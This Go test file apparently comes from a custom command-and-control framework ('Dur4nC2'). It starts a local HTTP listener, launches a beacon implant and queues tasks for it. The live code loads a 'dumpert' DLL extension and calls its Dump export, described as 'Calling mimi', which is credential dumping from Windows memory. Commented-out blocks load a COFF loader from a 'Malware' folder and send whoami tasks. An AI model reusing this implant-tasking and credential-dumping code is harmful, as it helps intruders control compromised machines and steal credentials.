package main

import (
	_implantCrypto "Dur4nC2/implant/cryptography"
	"Dur4nC2/implant/transport"
	_serverCrypto "Dur4nC2/misc/crypto"
	"Dur4nC2/misc/protobuf/commonpb"
	"Dur4nC2/misc/protobuf/implantpb"
	"Dur4nC2/server/db"
	beaconRepository "Dur4nC2/server/domain/beacon/repository/postgres"
	_implantRepository "Dur4nC2/server/domain/implant/respository/postgres"
	"Dur4nC2/server/domain/models"
	taskRepository "Dur4nC2/server/domain/task/repository/postgres"
	"Dur4nC2/server/listener"
	"fmt"
	"google.golang.org/protobuf/proto"
	"io/ioutil"
	"math/rand"
	"time"
)

var _ = Describe("Implant", func() {
	BeforeEach(func() {

	})

	Context("Manual connections", func() {
		It("Testing comipled implant", func() {
			/*
				//Create server
				server_keypair := _serverCrypto.ECCServerKeyPair()
				implant_keypair, err := _implantRepository.NewPosgresImplantRepository(db.Session()).Create()
				//fmt.Println("digest creaded = ", implant_keypair.ECCPublicKeyDigest)
				_implantCrypto.SetSecrets(implant_keypair.ECCPublicKey, implant_keypair.ECCPrivateKey, implant_keypair.ECCPublicKeyDigest, server_keypair.PublicBase64(), "", "", server_keypair.PrivateBase64())
				server, err := listener.StartHTTPListener(&listener.HTTPListenerConfig{
					Addr:   "127.0.0.1:8000",
					Domain: "127.0.0.1",
				})
				if err != nil {
					fmt.Println("Listener failed to start ", err)
					return
				}
				Ω(err).To(Succeed())
				go server.HTTPServer.ListenAndServe()
				if err != nil {
					fmt.Println("Listener failed to serve ", err)
					return
				}
				time.Sleep(60 * time.Second)

				fmt.Println("Waiting to launch and implant manually... Press enter")
				//scanner := bufio.NewScanner(os.Stdin)
				//scanner.Scan()
			*/
		})
		Context("Connections", func() {

			It("Implant can establish connection with the ts and register", func() {
				//Create server

				server_keypair := _serverCrypto.ECCServerKeyPair()
				implant_keypair, err := _implantRepository.NewPosgresImplantRepository(db.Session()).Create()
				//fmt.Println("digest creaded = ", implant_keypair.ECCPublicKeyDigest)
				_implantCrypto.SetSecrets(implant_keypair.ECCPublicKey, implant_keypair.ECCPrivateKey, implant_keypair.ECCPublicKeyDigest, server_keypair.PublicBase64(), "", "", server_keypair.PrivateBase64())
				server, err := listener.StartHTTPListener(&listener.HTTPListenerConfig{
					Addr:   "127.0.0.1:8000",
					Domain: "127.0.0.1",
				})
				if err != nil {
					fmt.Println("Listener failed to start ", err)
					return
				}
				Ω(err).To(Succeed())
				go server.HTTPServer.ListenAndServe()
				if err != nil {
					fmt.Println("Listener failed to serve ", err)
					return
				}
				time.Sleep(1 * time.Second)

				//Create beacon
				implantConfig := &models.ImplantConfig{
					Domain:     "127.0.0.1",
					URL:        "http://127.0.0.1:8000",
					PathPrefix: "",
				}
				go transport.BeaconStart(*implantConfig)
				time.Sleep(1 * time.Second)

				//Send tasks

				beaconRepo := beaconRepository.NewPostgresBeaconRepository(db.Session())
				taskRepo := taskRepository.NewPostgresBeaconTaskRepository(db.Session())
				beacons, err := beaconRepo.List()
				index := len(beacons) - 1
				currentBeacon := beacons[index]

				/*OLD
				request := &commonpb.Request{BeaconID: currentBeacon.ID.String()}
				whoamiReq := &implantpb.WhoamiReq{
					Request: request,
				}
				data, _ := proto.Marshal(whoamiReq)
				taskReq := &implantpb.Envelope{
					ID:   1,
					Type: implantpb.MsgWhoamiReq,
					Data: data,
				}
				taskReqData, _ := proto.Marshal(taskReq)

				v := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
				newTask := models.BeaconTask{
					EnvelopeID:  int64(v),
					BeaconID:    currentBeacon.ID,
					Description: "Whoami",
					State:       models.PENDING,
					Request:     taskReqData,
				}
				err = taskRepo.Create(currentBeacon, newTask)
				if err != nil {
					fmt.Printf("Error in task creation: %s\n", err)
					return
				}
				fmt.Println("[test] task sent...")
				time.Sleep(10 * time.Second)
				*/

				//Testing extension module
				/*COFF
				request2 := &commonpb.Request{BeaconID: currentBeacon.ID.String()}
				var coffLoaderPath = "D:\\Malware\\COFFLoader.x64.dll"
				loaderData, err := ioutil.ReadFile(coffLoaderPath)
				//fmt.Println(loaderData)
				if err != nil {
					return
				}
				registerExtensionReq := &implantpb.RegisterExtensionReq{
					Name:    extension.CoffLoaderName,
					OS:      "Windows",
					Init:    "",
					Data:    loaderData,
					Request: request2,
				}
				data2, _ := proto.Marshal(registerExtensionReq)
				taskReq2 := &implantpb.Envelope{
					ID:   2,
					Type: implantpb.MsgRegisterExtensionReq,
					Data: data2,
				}
				taskReqData, _ := proto.Marshal(taskReq2)

				v2 := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
				newTask2 := models.BeaconTask{
					EnvelopeID:  int64(v2),
					BeaconID:    currentBeacon.ID,
					Description: "Loading a new extension",
					State:       models.PENDING,
					Request:     taskReqData,
				}
				err = taskRepo.Create(currentBeacon, newTask2)
				if err != nil {
					fmt.Printf("Error in task creation: %s\n", err)
					return
				}
				fmt.Println("[test] task sent...")

				time.Sleep(10 * time.Second)
				var coffPath = "D:\\Malware\\netstat.x64.o"
				data, err := extension.GetBOFArgs(coffPath)
				request3 := &commonpb.Request{BeaconID: currentBeacon.ID.String()}
				callExtensionReq := &implantpb.CallExtensionReq{
					Name:    "coff-loader",
					Args:    data,
					Export:  "LoadAndRun",
					Request: request3,
				}
				data3, _ := proto.Marshal(callExtensionReq)
				taskReq3 := &implantpb.Envelope{
					ID:   3,
					Type: implantpb.MsgCallExtensionReq,
					Data: data3,
				}
				taskReqData3, _ := proto.Marshal(taskReq3)

				v3 := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
				newTask3 := models.BeaconTask{
					EnvelopeID:  int64(v3),
					BeaconID:    currentBeacon.ID,
					Description: "Calling a coff",
					State:       models.PENDING,
					Request:     taskReqData3,
				}
				err = taskRepo.Create(currentBeacon, newTask3)
				if err != nil {
					fmt.Printf("Error in task creation: %s\n", err)
					return
				}
				fmt.Println("[test] task sent...")
				time.Sleep(9000 * time.Second)
				*/

				request2 := &commonpb.Request{BeaconID: currentBeacon.ID.String()}
				var coffLoaderPath = "C:\\Users\\Jorge\\GolandProjects\\Dur4nC2\\extensions\\dumpert.dll"
				loaderData, err := ioutil.ReadFile(coffLoaderPath)
				//fmt.Println(loaderData)
				if err != nil {
					return
				}
				registerExtensionReq := &implantpb.RegisterExtensionReq{
					Name:    "dumpert",
					OS:      "Windows",
					Init:    "Dump",
					Data:    loaderData,
					Request: request2,
				}
				data2, _ := proto.Marshal(registerExtensionReq)
				taskReq2 := &implantpb.Envelope{
					ID:   2,
					Type: implantpb.MsgRegisterExtensionReq,
					Data: data2,
				}
				taskReqData, _ := proto.Marshal(taskReq2)

				v2 := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
				newTask2 := models.BeaconTask{
					EnvelopeID:  int64(v2),
					BeaconID:    currentBeacon.ID,
					Description: "Loading a new extension",
					State:       models.PENDING,
					Request:     taskReqData,
				}
				err = taskRepo.Create(currentBeacon, newTask2)
				if err != nil {
					fmt.Printf("Error in task creation: %s\n", err)
					return
				}
				fmt.Println("[test] task sent...")

				time.Sleep(10 * time.Second)

				data := []byte("")
				request3 := &commonpb.Request{BeaconID: currentBeacon.ID.String()}
				callExtensionReq := &implantpb.CallExtensionReq{
					Name:    "dumpert",
					Args:    data,
					Export:  "Dump",
					Request: request3,
				}
				data3, _ := proto.Marshal(callExtensionReq)
				taskReq3 := &implantpb.Envelope{
					ID:   3,
					Type: implantpb.MsgCallExtensionReq,
					Data: data3,
				}
				taskReqData3, _ := proto.Marshal(taskReq3)

				v3 := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
				newTask3 := models.BeaconTask{
					EnvelopeID:  int64(v3),
					BeaconID:    currentBeacon.ID,
					Description: "Calling mimi",
					State:       models.PENDING,
					Request:     taskReqData3,
				}
				err = taskRepo.Create(currentBeacon, newTask3)
				if err != nil {
					fmt.Printf("Error in task creation: %s\n", err)
					return
				}
				fmt.Println("[test] task sent...")
				time.Sleep(9000 * time.Second)
			})

		})
	})
})
